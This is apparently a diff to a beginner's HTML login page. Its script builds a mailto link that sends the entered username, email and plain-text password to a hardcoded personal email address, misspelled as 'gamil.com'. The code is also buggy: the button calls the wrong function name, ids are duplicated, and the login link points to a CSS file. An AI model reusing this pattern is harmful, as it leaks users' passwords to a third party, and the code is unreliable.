@@ -58,7 +58,7 @@
               </span>
             </a>
             <div class="user_option">
-              <a href="#">
+              <a href="css/login.css">
                 login
               </a>
               <form class="form-inline ">
@@ -74,35 +74,38 @@
 
   <!-- login section -->
   <section class="login">
-   <br>
-   <div id="head"><h1>LOGIN</h1></div>
-   <br>
-   <div id="name"><b>USER NAME : <input type="username"></b></div>
+    <br>
+    <div id="head"><h1>LOGIN</h1></div>
+    <br>
+    <div id="name"><b>USER NAME : <input type="text" id="name"></b></div>
     <br>
     <br>
-    <div id="email"><b>EMAIL : <input type="email"> </b></div>
+    <div id="email"><b>EMAIL : <input type="email" id="email"> </b></div>
     <br>
     <br>
-    <div id="password"><b>PASSWORD: <input type="password"></b></div>
-    <br><br><br><br><br>
-    </section>
+    <div id="password"><b>PASSWORD: <input type="password" id="password"></b></div>
+    <br><br>
+    <div id="button"><button onclick="submit()">submit</button></div>
+    <br><br><br><br><br> 
+  </section>
+  
   <!-- end of login section -->
   <!-- script -->
   <script>
    function submitForm() {
-       const username = document.getElementById('username').value;
+       const username = document.getElementById('name').value;
        const email = document.getElementById('email').value;   
 
        const password = document.getElementById('password').value;
 
        const   
-recipientEmail = 'reddycherish76@gmail.com'; // Replace with your email address
+       recipientEmail = 'reddycherish76@gamil.com'; // Replace with your email address
 
        const mailtoLink = `mailto:${recipientEmail}?subject=Login Details&body=Username: ${username}%0AEmail: ${email}%0APassword: ${password}`;
 
        window.location.href = mailtoLink;
-   }
-</script>
+       }
+   </script>
    <!-- end script -->
   <!-- info section -->
 
